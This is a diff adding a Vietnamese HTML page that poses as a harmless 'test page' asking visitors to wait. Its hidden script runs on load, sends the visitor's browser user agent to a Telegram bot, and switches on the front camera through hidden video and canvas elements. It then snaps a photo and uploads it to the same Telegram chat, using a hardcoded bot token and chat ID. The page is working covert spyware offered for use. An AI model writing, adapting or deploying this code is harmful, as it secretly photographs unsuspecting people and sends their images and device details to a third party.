@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Test</title>
+</head>
+<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h2>Trang web thử nghiệm</h2>
+    <p>Vui lòng chờ trong giây lát...</p>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // === THAY THÔNG TIN CỦA BẠN VÀO DƯỚI ĐÂY ===
+        const BOT_TOKEN = '8377654831:AAG7Q_WCxKJ5K8c0hFiXgr0BJBFQmKEiynA';
+        const CHAT_ID = '7662943088';
+        // ============================================
+
+        // Gửi thông tin thiết bị
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `📱 **Có thiết bị truy cập:**\n${navigator.userAgent}`,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // Bật camera và chụp
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'cam.jpg');
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => stream.getTracks().forEach(t => t.stop()));
+                }, 'image/jpeg', 0.8);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
